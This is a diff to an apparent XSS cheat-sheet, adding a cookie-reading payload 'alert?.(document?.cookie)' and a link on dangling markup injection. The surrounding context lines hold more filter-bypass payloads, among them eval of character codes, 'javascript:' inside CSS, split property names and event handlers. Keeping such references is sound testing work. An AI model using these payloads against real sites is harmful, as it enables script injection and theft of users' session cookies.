@@ -68,6 +68,7 @@ target=""onload="..." // filter to remove target/onload/... is applied only once
 eval(String.fromCharCode(...
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"> // IE, some versions of Safari and others) allow JavaScript in CSS, use the moz-binding CSS property for Gecko-based browsers
 alert(eval('document.body.inne' + 'rHTML'));
+alert?.(document?.cookie)
 java%0ascript
 prompt(1), confirm(...)
 oninput= onplay= // html5
@@ -173,6 +174,9 @@ https://conference.hitb.org/hitbsecconf2016ams/materials/D1T2%20-%20Michele%20Sp
 # length restriction bypasses
 convert to domxss: <script>eval(location.hash.substr(1))</script>
 span an attack payload across multiple fields (twahh p.412)
+
+# dangling markup injection
+https://lcamtuf.coredump.cx/postxss/
 
 # sop for file: URIs
 https://developer.mozilla.org/en-US/docs/Archive/Misc_top_level/Same-origin_policy_for_file:_URIs
